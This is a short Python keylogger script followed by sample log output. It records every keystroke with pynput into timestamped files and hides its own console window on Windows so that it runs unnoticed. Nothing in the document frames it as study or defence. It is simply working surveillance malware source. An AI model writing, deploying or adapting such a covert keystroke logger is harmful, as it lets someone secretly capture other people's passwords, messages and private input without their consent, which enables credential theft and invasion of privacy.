from pynput import keyboard
import logging
import os
from datetime import datetime
import ctypes

# Hide the console window (only works on Windows)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Create a logs directory if not exists
if not os.path.exists("logs"):
    os.makedirs("logs")

# Create a log file with a timestamp
log_filename = f"logs/windows_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Handle key press
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()


## Output Example

2025-07-26 19:10:21,123 - Key pressed: h  
2025-07-26 19:10:21,456 - Key pressed: i  
2025-07-26 19:10:21,789 - Special key: Key.enter
